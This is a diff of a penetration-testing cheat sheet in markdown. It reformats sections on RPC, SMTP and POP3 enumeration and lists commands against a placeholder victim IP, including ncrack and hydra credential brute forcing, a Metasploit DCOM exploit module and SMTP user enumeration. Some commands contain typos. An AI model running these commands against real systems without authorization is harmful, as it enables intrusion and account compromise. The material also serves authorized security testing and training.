@@ -29,9 +29,18 @@
   - [nmap rdp scan](nmap_rdp_scan])
   - [Bruteforce RDP credentials](#bruteforce_rdp_credentials)
 - [RPC](#RPC)
+  - [nmap](#nmap)
+  - [metasploit scan](#metasploit)
 - [SNMP](#SNMP)
 - [SMTP](#SMTP)
+  - [Netcat](#Netcat)
+  - [Telnet](#Telent)
+  - [Metasploit](#Metasploit)
+  - [smtp snum script](#smtp-user-enum)
+  - [Nmap](#nmap)
+  - [Bruteforce](#Bruteforce)
 - [POP3](POP3)
+  - [Telnet](#Telnet)
 - [SMB](#SMB)
   - [nmap scipt](#nmap)
   - [rpcclient](#rpcclient)
@@ -59,6 +68,7 @@
   - [Semicolen_file_extension_bypassing](#Semicolen_file_extension_bypassing)
   - [cadaver_tool](#cadaver_tool)
   - [Use_PUT_method](#Use_PUT_method)
+ - [MongoDB](#MongoDB)
 --------------------------------------------------------------------------------------------------------------------------------
 ## Amazon_S3
 
@@ -427,12 +437,12 @@ ncrack -vv --user administrator -P password-file.txt rdp://[victim_ip]
 rpcinfo -p [victim_ip]
 ```
 
-### nmap
+## nmap
 ```
 nmap [vitim_ip] --script msrpc-enum
 ```
 
-### metasploit
+## metasploit
 ```
 msf> use exploit/windows/dcerpc/ms03_026_dcom
 ```
@@ -469,62 +479,50 @@ SNMP Managment Information Base (MIB) is a database contains info related to net
 -------------------------------------------------------------------------------------------------------------------------------------
 # SMTP
 
-##### nc -nv [victim_ip] [smtp_port]
+## Netcat
+```
+nc -nv [victim_ip] [smtp_port]
+```
 - VRFY root
 - VRFY [some_user_name]
 ***VRFY***: verify an email address
 ***EXPN***: asks the server for the membership of mailing list
 
-##### telnet <victim_ip> <port>
- 
-##### Metasploit
-- auxiliary/scanner/smtp/smtp_enum
-  - set rhosts <victim_ip>
-  - run
+## Telnet
+```
+telnet <victim_ip> <port>
 
-##### telnet
-'''
->telnet [victim_ip] 25
+telnet <victim_ip> <port>
 >EHLO root
 >DATA
 >QUIT
-'''
-
-##### smtp-user-enum
-- perl smtp-user-enum -M VRFY -U user.txt -t <victim_ip
+```
+## Metasploit
+```
+auxiliary/scanner/smtp/smtp_enum
+```
+## smtp-user-enum
+```
+perl smtp-user-enum -M VRFY -U user.txt -t <victim_ip
+```
 dictionary
  - /usr/share/wordlists/metasploit/unix_users.txt
  - /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames-dup.txt
 
-##### nmap enumeration
-- nmap –script smtp-enum-users.nse <victim_ip>
-- nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 [victim_ip]
+## nmap
+```
+nmap –script smtp-enum-users.nse <victim_ip>
+nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 [victim_ip]
+```
 
-##### Bruteforce
-- hydra -P /usr/share/wordlistsnmap.lst [victim_ip] smtp -V
-
-###### example python VRFY automation script 
-```python
-#!/usr/bin/python
-import socket
-import sys
-if len(sys.argv) != 2:
-  print("Usage: vrfy.py [username]"):
-  sys.exit(0)
-s=socket.socket(socket.AF_INET,
-
-socket.SOCK_STREAM)
-connect=s.connect(('[victim_ip]',25))
-banner=s.recv(1024)
-print(banner)
-s.send('VRFY'+sys.argv[1]+'\r\n')
-result=s.recv(1024)
-print(result)
-s.close()
+## Bruteforce
+```
+hydra -P /usr/share/wordlistsnmap.lst [victim_ip] smtp -V
 ```
 -------------------------------------------------------------------------------------------------------------------------------------
 # POP3
 
+## Telnet
 ```
 telnet [victim_ip] [pop3_port]
 > USER username
